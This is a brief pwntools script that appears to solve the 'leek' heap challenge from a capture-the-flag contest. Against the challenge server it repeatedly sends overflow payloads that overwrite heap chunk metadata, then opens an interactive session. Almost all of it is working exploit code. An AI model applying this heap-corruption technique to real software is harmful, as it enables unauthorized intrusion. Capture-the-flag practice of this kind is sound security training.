from pwn import *
context.binary = "./leek"

s = remote("challs.actf.co", 31310)
#s = process(executable= "./leek", argv = [])
gdbscript = '''
bp 0x4016AE
bp 0x4015E5
bp 0x000000000040169A
'''
#s = gdb.debug("./leek", gdbscript = gdbscript)

for i in range(100):
	payload = b"a"*0x10 + b"a"*16 + b"a" * 0x20
	s.sendline(payload)
	s.send(b"a" * 0x20)
	payload = b"a"*0x10 + p64(0) + p64(0x31) + b"\x00" * 0x20
	s.sendline(payload)
s.interactive()
	